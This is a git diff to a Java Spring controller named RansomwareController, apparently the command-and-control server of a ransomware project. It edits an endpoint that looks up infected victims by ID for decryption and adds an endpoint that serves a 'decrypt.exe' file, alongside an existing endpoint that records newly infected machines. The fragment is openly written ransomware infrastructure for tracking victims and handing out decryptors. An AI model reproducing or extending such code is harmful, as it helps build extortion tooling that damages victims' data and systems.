@@ -15,8 +15,8 @@ public class RansomwareController {
 	public RansomwareController(){}
 	
 	@RequestMapping("/sendDecrypt")
-	public Infected sendDecrypt(String infectedId){
-		return infectedRepo.findById(infectedId);
+	public Infected sendDecrypt(String id){
+		return infectedRepo.findById(id);
 	}
 	
 	@RequestMapping("/sendEncrypt")
@@ -35,6 +35,11 @@ public class RansomwareController {
 		
 		infectedRepo.save(newInfected);
 		return newInfected;
+	}
+
+	@RequestMapping()
+	public FileSystemResource getFile() {
+	    return new FileSystemResource(myService.getFileFor("decrypt.exe")); 
 	}
 	
 }
